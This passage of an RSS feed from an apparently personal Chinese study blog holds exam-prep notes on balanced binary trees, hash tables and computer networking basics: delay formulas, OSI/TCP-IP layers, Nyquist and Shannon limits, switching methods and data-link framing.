&lt;li&gt;平衡二叉树的建立&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;建立平衡二叉树的过程和建立二叉排序树的过程基本一样，都是将关键字逐个插入空树中的过程。所不同的是，在建立平衡二叉树的过程中，每插入一个新的关键字都要进行检查，看新关键字的插入是否会使得原平衡二叉树失去平衡，即树中出现平衡因子绝对值大于1的结点。如果失去平衡则需要进行平衡调整。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;平衡调整&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;假定向平衡二叉树中插入一个新结点后破坏了平衡二叉树的平衡性，则首先要找出插入新结点后失去平衡的最小子树，然后再调整这棵子树，使之成为平衡子树。值得注意的是，当失去平衡的最小子树被调整为平衡子树后，无须调整原有其他所有的不平衡子树，整个二叉排序树就会成为一棵平衡二叉树。所谓失去平衡的最小子树是指距离插入结点最近，且以平衡因子绝对值大于1的结点作为根的子树，又称为最小不平衡子树。&lt;/p&gt;
&lt;h3 id=&#34;b-树的基本概念及其基本操作b树的基本概念&#34;&gt;B-树的基本概念及其基本操作、B+树的基本概念&lt;/h3&gt;
&lt;h4 id=&#34;b-树的基本概念&#34;&gt;B-树的基本概念&lt;/h4&gt;
&lt;h4 id=&#34;b-树的基本操作&#34;&gt;B-树的基本操作&lt;/h4&gt;
&lt;h4 id=&#34;b树的基本概念&#34;&gt;B+树的基本概念&lt;/h4&gt;
&lt;h3 id=&#34;散列表&#34;&gt;散列表&lt;/h3&gt;
&lt;h4 id=&#34;散列表的概念&#34;&gt;散列表的概念&lt;/h4&gt;
&lt;p&gt;根据给定的关键字来计算关键字在表中的地址&lt;/p&gt;
&lt;h4 id=&#34;散列表的建立方法以及冲突解决方法&#34;&gt;散列表的建立方法以及冲突解决方法&lt;/h4&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">计算机基础知识</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">计算机</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/408/">408</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>计算机网络</title>
                <link>https://xuoneyuan.github.io/posts/11/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/11/</guid>
                <pubDate>Mon, 25 Dec 2023 14:56:10 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;h2 id=&#34;计算机网络体系结构&#34;&gt;计算机网络体系结构&lt;/h2&gt;
&lt;h3 id=&#34;计算机网络概述&#34;&gt;计算机网络概述&lt;/h3&gt;
&lt;h4 id=&#34;计算机网络的概念&#34;&gt;计算机网络的概念&lt;/h4&gt;
&lt;p&gt;计算机网络就是一些互联的、自治的计算机系统的集合&lt;/p&gt;
&lt;h4 id=&#34;计算机网络的组成&#34;&gt;计算机网络的组成&lt;/h4&gt;
&lt;h5 id=&#34;物理组成&#34;&gt;物理组成&lt;/h5&gt;
&lt;p&gt;包括硬件、软件、协议三大部分&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;硬件：由主机、通信处理机、通信线路和交换设备组成&lt;/li&gt;
&lt;li&gt;软件：主要包括实现资源共享的软件和方便用户使用的各种工具软件&lt;/li&gt;
&lt;li&gt;协议：数据在线路上传输需要遵循一定的规则&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;工作方式组成&#34;&gt;工作方式组成&lt;/h5&gt;
&lt;p&gt;可分为边缘部分和核心部分&lt;/p&gt;
&lt;h5 id=&#34;功能组成&#34;&gt;功能组成&lt;/h5&gt;
&lt;p&gt;可分为&lt;strong&gt;通信子网&lt;/strong&gt;和&lt;strong&gt;资源子网&lt;/strong&gt;两部分&lt;/p&gt;
&lt;h4 id=&#34;计算机网络的功能&#34;&gt;计算机网络的功能&lt;/h4&gt;
&lt;h4 id=&#34;计算机网络的分类&#34;&gt;计算机网络的分类&lt;/h4&gt;
&lt;h4 id=&#34;计算机网络主要性能指标&#34;&gt;计算机网络主要性能指标&lt;/h4&gt;
&lt;h5 id=&#34;时延&#34;&gt;时延&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;发送时延，也称为传输时延&lt;br&gt;
主机或路由器发送数据帧所需要的时间&lt;br&gt;
发送时延 = 数据帧长度 (bit) / 发送速率 (bit/s)&lt;/li&gt;
&lt;li&gt;传播时延&lt;br&gt;
传播时延 = 信道长度 (m) / 电磁波在信道上的传播速度 （m/s)&lt;/li&gt;
&lt;li&gt;处理时延&lt;/li&gt;
&lt;li&gt;排队时延&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;总时延 = 发送时延 + 传播时延 + 处理时延 + 排队时延&lt;/strong&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;一般排队时延和处理时延忽略不计&lt;br&gt;
对于高速网络链路，提高的是数据发送速率不是比特在链路上的传播速度&lt;/p&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h5 id=&#34;时延带宽积&#34;&gt;时延带宽积&lt;/h5&gt;
&lt;p&gt;又称为以比特为单位的链路长度&lt;br&gt;
&lt;strong&gt;时延带宽积 = 传播时延 * 带宽&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;往返时间&#34;&gt;往返时间&lt;/h5&gt;
&lt;p&gt;从发送方发送数据开始，到发送方收到来自接收方的确认消息总共经历的时间&lt;/p&gt;
&lt;h5 id=&#34;利用率&#34;&gt;利用率&lt;/h5&gt;
&lt;p&gt;包括信道利用率和网络利用率&lt;/p&gt;
&lt;h3 id=&#34;计算机网络体系结构与参考模型&#34;&gt;计算机网络体系结构与参考模型&lt;/h3&gt;
&lt;h4 id=&#34;计算机网络分层结构&#34;&gt;计算机网络分层结构&lt;/h4&gt;
&lt;h4 id=&#34;协议&#34;&gt;协议&lt;/h4&gt;
&lt;h4 id=&#34;接口&#34;&gt;接口&lt;/h4&gt;
&lt;p&gt;又称为服务访问点，从物理层开始每一层都向上层提供服务访问点，没有接口就不能提供服务&lt;/p&gt;
&lt;h4 id=&#34;服务&#34;&gt;服务&lt;/h4&gt;
&lt;p&gt;指下层为相邻上层提供的功能调用&lt;/p&gt;
&lt;h4 id=&#34;isoosi参考模型和tcpip参考模型&#34;&gt;ISO/OSI参考模型和TCP/IP参考模型&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;5层结构的总结&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;层次&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;应用层（用户对用户）&lt;/td&gt;
&lt;td&gt;任务：提供系统与用户的接口&lt;br&gt;功能：文件传输、访问和管理、电子邮件服务&lt;br&gt;协议：FTP、SMTP、HTTP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;传输层（应用对应用 进程对进程）&lt;/td&gt;
&lt;td&gt;传输单位：报文段(TCP)或用户数据报(UDP)&lt;br&gt;任务：负责两个进程之间的通信&lt;br&gt;功能：为端到端连接提供可靠的传输服务和管理服务&lt;br&gt;协议：TCP、UDP、ARQ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;网络层（主机对主机）&lt;/td&gt;
&lt;td&gt;传输单位：数据报&lt;br&gt;所实现的硬件：路由器&lt;br&gt;任务：将传输层传下来的报文段封装成分组；选择适当的路由使得传输层传下来的分组能够交付到目的主机&lt;br&gt;功能：为传输层提供服务；组包和拆包；路由选择；拥塞控制&lt;br&gt;协议：ICMP、ARP、RAP、IP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据链路层&lt;/td&gt;
&lt;td&gt;传输单位：帧&lt;br&gt;所实现的硬件：交换机、网桥&lt;br&gt;任务：将网络层传下来的IP数据报组装成帧&lt;br&gt;功能：链路连接的建立、拆除、分离；帧定界和帧同步；差错检测&lt;br&gt;协议：PPP、HDLC&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;物理层&lt;/td&gt;
&lt;td&gt;传输单位：比特&lt;br&gt;所实现的硬件：集线器、中继器&lt;br&gt;任务：透明地传输比特流&lt;br&gt;功能：为数据端设备提供传送数据通路&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;


&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;补充知识&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;会话层&lt;br&gt;
会话层的主要功能是在两个节点间建立、维护和释放面向用户的连接，并对会话进行管理和控制，保证会话数据可靠传送\&lt;/li&gt;
&lt;li&gt;表示层&lt;br&gt;
表示层负责处理在两个内部数据表示结构不同的通信系统间交换信息的表示格式，为数据加密和解密以及为提高传输效率提供必需的数据压缩及解压等功能&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;

2. OSI参考模型和TCP/IP模型的区别&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;OSI参考模型&lt;/th&gt;
&lt;th&gt;TCP/IP模型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;3个主要概念：服务、接口、协议&lt;/td&gt;
&lt;td&gt;没有明确区分服务、接口、协议&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;协议有很好的隐藏性&lt;/td&gt;
&lt;td&gt;产生在协议发明之后&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;产生在协议发明之前&lt;/td&gt;
&lt;td&gt;共有4层&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;共有7层&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;网络层：连接和无连接&lt;/td&gt;
&lt;td&gt;网络层：仅有无连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;传输层：仅有面向连接&lt;/td&gt;
&lt;td&gt;传输层：面向连接和无连接&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;TCP/IP模型是4层模型(应用层、传输层、网络层、网络接口层)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCP/IP模型的网络层提供的是无连接不可靠的数据报服务&lt;/strong&gt;&lt;/p&gt;



&lt;div class=&#34;notice notice-warning&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 576 512&#34;&gt;&lt;path d=&#34;M570 440c18 32-5 72-42 72H48c-37 0-60-40-42-72L246 24c19-32 65-32 84 0l240 416zm-282-86a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;物理层是不参与封装的，物理层以0、1比特流的形式透明地传输数据链路层递交的帧。网络层、应用层都把上层递交的数据加上首部，数据链路层在接收上层递交的数据时不但要给其加上首部，还要加上尾部&lt;/p&gt;&lt;/div&gt;

&lt;h2 id=&#34;物理层&#34;&gt;物理层&lt;/h2&gt;
&lt;h3 id=&#34;通信基础&#34;&gt;通信基础&lt;/h3&gt;
&lt;h4 id=&#34;信号&#34;&gt;信号&lt;/h4&gt;
&lt;p&gt;信号：数据的电气或电磁的表现，数据是传送信息的实体



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;无论数据或信号，都既可以是模拟的，也可以是数字的&lt;/li&gt;
&lt;li&gt;信道上传送的信号分为基带信号和宽带信号。基带对应数字信号，宽带对应模拟信号&lt;/li&gt;
&lt;li&gt;宽带传输可以等同于频带传输，只是宽带传输有更多的子信道&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;信源信道及信宿&#34;&gt;信源、信道及信宿&lt;/h4&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;数据传输方式分为串行传输和并行传输&lt;/li&gt;
&lt;li&gt;通信方式分为同步通信(接收端时钟频率和发送端时钟频率相等)和异步通信&lt;/li&gt;
&lt;li&gt;通信模式分为单工、半双工、全双工&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;

&lt;h4 id=&#34;速率波特及码元&#34;&gt;速率、波特及码元&lt;/h4&gt;
&lt;p&gt;波特率：表示单位时间内数字通信系统所传输的二进制码元个数(也可称为脉冲个数或者信号变化的次数)，单位是波特(Baud)，1波特表示数字通信系统每秒传输1个码元&lt;br&gt;
比特率：表示单位时间内数字通信系统所传输的二进制码元个数，即比特数，单位为bit/s&lt;br&gt;
正常情况下，每比特只能表示两种信号变化(0或1)，可看成二进制。但是一个码元仅携带一个比特数据率很低，所以通过一些手段将信号的变化次数增加，从而让一个码元携带更多的比特。例如增加到16种信号变化(可看成十六进制)，那么需要4bit(log&lt;sub&gt;2&lt;/sub&gt;16 = 4)来表示，此时一个码元携带了4bit&lt;/p&gt;
&lt;h4 id=&#34;带宽&#34;&gt;带宽&lt;/h4&gt;
&lt;p&gt;传统定义：通信线路允许通过的信号频带范围，就是允许通过的最高频率减去最低频率&lt;br&gt;
但是在计算机网络中，带宽是用来表示网络的通信线路所能传送数据的能力&lt;/p&gt;
&lt;h4 id=&#34;奈奎斯特定理&#34;&gt;奈奎斯特定理&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;采样定理
假设原始信号中最大频率为f，那么采样频率f&lt;sub&gt;采样&lt;/sub&gt;必须大于或等于最大频率f的两倍，才能保证采样后的数字信号完整保留原始模拟信号的信息&lt;/li&gt;
&lt;li&gt;奈奎斯特定理
怎么寻找在保证不出现码间串扰的条件下码元传输速率的最大值？奈奎斯特在采样定理和无噪声的基础上，提出了奈奎斯特定理：&lt;br&gt;
C&lt;sub&gt;max&lt;/sub&gt;=f&lt;sub&gt;采样&lt;/sub&gt;*log&lt;sub&gt;2&lt;/sub&gt;N=2f * log&lt;sub&gt;2&lt;/sub&gt;N (bit/s)&lt;br&gt;
其中f表示理想低通信道的带宽；N表示每个码元的离散电平的数目



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;奈奎斯特定理仅给出了在无噪声情况下码元的最大传输速率(2f)，并没有给出最大数据传输率，只要N足够大，最大数据传输速率C&lt;sub&gt;max&lt;/sub&gt;就可以无穷大&lt;/p&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;香农定理&#34;&gt;香农定理&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;信噪比(dB)=10log&lt;sub&gt;10&lt;/sub&gt;(S/N) (dB)&lt;/strong&gt;&lt;br&gt;
引入信噪比之后可得出香农公式为&lt;br&gt;
&lt;strong&gt;C&lt;sub&gt;max&lt;/sub&gt;=W*log&lt;sub&gt;2&lt;/sub&gt;(1+S/N) (bit/s)&lt;/strong&gt; &lt;br&gt;
W为信道的带宽，想要提高最大数据传输速率，应该设法提高带宽或者信噪比&lt;/p&gt;
&lt;h4 id=&#34;编码与调制&#34;&gt;编码与调制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;调制&lt;br&gt;
数字数据调制为模拟信号：带通调制、基带调制&lt;/li&gt;
&lt;li&gt;编码&lt;br&gt;
数字数据编码为数字信号&lt;br&gt;
非归零码(NRZ):用低电平表示0，高电平表示1&lt;br&gt;
曼彻斯特编码：将每个码元分成两个相等的间隔，前一个间隔为高电平而后一个间隔为低电平表示码元1，码元0正好相反&lt;br&gt;
差分曼彻斯特编码：若码元为1，则其前半个码元的电平与上一个码元的后半个码元的电平一样；若码元为0，则其前半个码元的电平与上一个码元的后半个码元的电平相反&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;数据传输方式&#34;&gt;数据传输方式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;电路交换&lt;br&gt;
电路交换在通信之前要在通信双方之间建立一条被双方独占的物理通路&lt;/li&gt;
&lt;li&gt;报文交换&lt;br&gt;
数据交换的单位是报文，报文携带有目的地址、源地址等信息，在交换节点采用存储转发的传输方式&lt;/li&gt;
&lt;li&gt;分组交换&lt;br&gt;
分组交换仍采用存储转发传输方式，但将一个长报文先分割为若干个较短的分组，然后把这些分组逐个地发送出去&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;电路交换一定是面向连接的，分组交换存在面向连接和无连接两种情况&lt;/p&gt;&lt;/div&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;比较标准&lt;/th&gt;
&lt;th&gt;电路交换&lt;/th&gt;
&lt;th&gt;分组交换&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;建立连接&lt;/td&gt;
&lt;td&gt;需要&lt;/td&gt;
&lt;td&gt;不需要&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;专用物理路径&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;每个分组沿着规定的路径&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;分组按序到达&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;路由器的瘫痪对整体产生影响&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;可用带宽&lt;/td&gt;
&lt;td&gt;固定&lt;/td&gt;
&lt;td&gt;动态&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;可能拥塞的时间点&lt;/td&gt;
&lt;td&gt;建立呼叫连接的时候&lt;/td&gt;
&lt;td&gt;每个分组传送的时候&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;可能有浪费的带宽&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;使用存储转发&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;透明性&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;数据报与虚电路&#34;&gt;数据报与虚电路&lt;/h4&gt;
&lt;p&gt;数据报&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;发送分组前无需建立连接&lt;/li&gt;
&lt;li&gt;网络尽最大努力交付，传输不保证可靠性，有可能丢失&lt;/li&gt;
&lt;li&gt;在具有多个分组的报文中，交换机尚未接受完第二个分组，已经收到的第一个分组就可以转发出去，不仅减小了延迟，而且大大提高了吞吐量&lt;/li&gt;
&lt;li&gt;当某一台交换机或一段链路故障时，可相应地更新转发表，寻找到另一条替代路径转发分组，对故障适应能力强&lt;/li&gt;
&lt;li&gt;发送方和接收方不独占某一链路，资源利用率高&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;虚电路&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户之间必须建立通信连接，数据传输过程中不再需要寻找路径，相对数据包方式时延较小&lt;/li&gt;
&lt;li&gt;通常分组走同样的路径，所以分组一定是按序到达目的主机的&lt;/li&gt;
&lt;li&gt;分组首部并不包含目的地址，而是包含虚电路标识符，相对数据报方式开销小&lt;/li&gt;
&lt;li&gt;当某个交换机或某条链路出现故障彻底失效时，所有经过该交换机或该链路的虚电路将遭到破坏&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;比较标准&lt;/th&gt;
&lt;th&gt;数据报服务&lt;/th&gt;
&lt;th&gt;虚电路服务&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;连接的建立&lt;/td&gt;
&lt;td&gt;无需建立连接&lt;/td&gt;
&lt;td&gt;需要建立连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;地址信息&lt;/td&gt;
&lt;td&gt;每个分组包含完整的源地址和目的地址&lt;/td&gt;
&lt;td&gt;每个分组包含一个虚电路号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;状态信息&lt;/td&gt;
&lt;td&gt;路由器不保留任何有关连接的状态信息&lt;/td&gt;
&lt;td&gt;每个虚电路都要求路由器为每个连接建立表项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;分组的转发&lt;/td&gt;
&lt;td&gt;单个分组独立转发&lt;/td&gt;
&lt;td&gt;根据预定路径转发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;路由器失效的影响&lt;/td&gt;
&lt;td&gt;每个分组独立处理，影响局部&lt;/td&gt;
&lt;td&gt;影响已建立的所有连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;端到端的差错处理&lt;/td&gt;
&lt;td&gt;由主机负责&lt;/td&gt;
&lt;td&gt;由通信子网负责&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;端到端的流量控制&lt;/td&gt;
&lt;td&gt;由主机负责&lt;/td&gt;
&lt;td&gt;由通信子网负责&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;分组的顺序&lt;/td&gt;
&lt;td&gt;无序&lt;/td&gt;
&lt;td&gt;保持顺序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;思路&lt;/td&gt;
&lt;td&gt;可靠通信由用户主机来保证&lt;/td&gt;
&lt;td&gt;可靠通信由网络来保证&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;注：数据报服务和虚电路服务都由网络层提供&lt;/p&gt;
&lt;h3 id=&#34;传输介质&#34;&gt;传输介质&lt;/h3&gt;
&lt;h4 id=&#34;传输介质分类&#34;&gt;传输介质分类&lt;/h4&gt;
&lt;p&gt;导向型传输介质：包含双绞线、同轴电缆和光纤&lt;/p&gt;
&lt;h3 id=&#34;物理层设备&#34;&gt;物理层设备&lt;/h3&gt;
&lt;h4 id=&#34;中继器&#34;&gt;中继器&lt;/h4&gt;
&lt;p&gt;放大器放大的是模拟信号，中继器放大的是数字信号&lt;/p&gt;
&lt;h4 id=&#34;集线器&#34;&gt;集线器&lt;/h4&gt;
&lt;p&gt;集线器不能隔离冲突域&lt;/p&gt;
&lt;h2 id=&#34;数据链路层&#34;&gt;数据链路层&lt;/h2&gt;
&lt;h3 id=&#34;数据链路层的功能&#34;&gt;数据链路层的功能&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;链路管理：负责数据链路的建立、维持和释放，主要用于面向连接的服务&lt;/li&gt;
&lt;li&gt;帧同步：接收方确定收到的比特流中一帧的开始位置与结束位置&lt;/li&gt;
&lt;li&gt;差错控制：用于使接收方确定接收到的数据就是由发送发送的数据&lt;/li&gt;
&lt;li&gt;透明传输：不管数据是什么样的比特组合都应当能在链路上传送&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;帧定界&lt;br&gt;
解析：当两个主机互相传送信息时，网络层的分组必须封装成帧，并以帧的格式进行传送。将一段数据的前后分别添加首部和尾部，就构成了帧。首部和尾部中含有很多控制信息，这些信息的重要作用之一是确定帧的界限，即帧定界。例如在HDLC协议中的帧格式使用标志F(01111110)来标识帧的开始和结束&lt;/p&gt;&lt;/div&gt;

&lt;h3 id=&#34;组帧&#34;&gt;组帧&lt;/h3&gt;
&lt;p&gt;组帧的优点：如果出错只需发送出错的帧即可&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;字符计数法&lt;/li&gt;
&lt;li&gt;字节填充的首尾界符法&lt;/li&gt;
&lt;li&gt;比特填充的首尾标志法&lt;/li&gt;
&lt;li&gt;物理编码违例法&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注：在使用字节填充的首尾界符法时，并不是所有形式的帧都需要帧开始符和帧结束符&lt;/p&gt;
&lt;h3 id=&#34;差错控制&#34;&gt;差错控制&lt;/h3&gt;
&lt;h4 id=&#34;检错编码&#34;&gt;检错编码&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;奇偶校验码&lt;br&gt;
在信息码后面加一位校验码，分奇校验和偶校验&lt;br&gt;
